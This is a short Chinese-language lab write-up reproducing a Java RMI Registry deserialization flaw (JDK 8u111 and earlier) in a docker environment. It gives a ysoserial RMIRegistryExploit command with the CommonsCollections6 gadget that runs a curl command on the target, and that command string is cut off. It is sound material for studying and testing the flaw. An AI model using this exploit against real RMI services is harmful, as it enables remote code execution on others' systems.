# Java RMI Registry 反序列化漏洞(<=jdk8u111)

## 漏洞环境

执行如下命令编译及启动RMI Registry和服务器：

```plain
docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
```

其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。

环境启动后，RMI Registry监听在1099端口。

## 漏洞复现

通过ysoserial的exploit包中的RMIRegistryExploit进行攻击

```plain
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl you
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780885783003-8504d83c-2252-4ea0-a841-94b2fb493d80.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780885783123-ee718d82-a2ac-4978-be90-8a596d4217e9.png)

Registry会返回报错，这个没关系正常，命令会正常执行。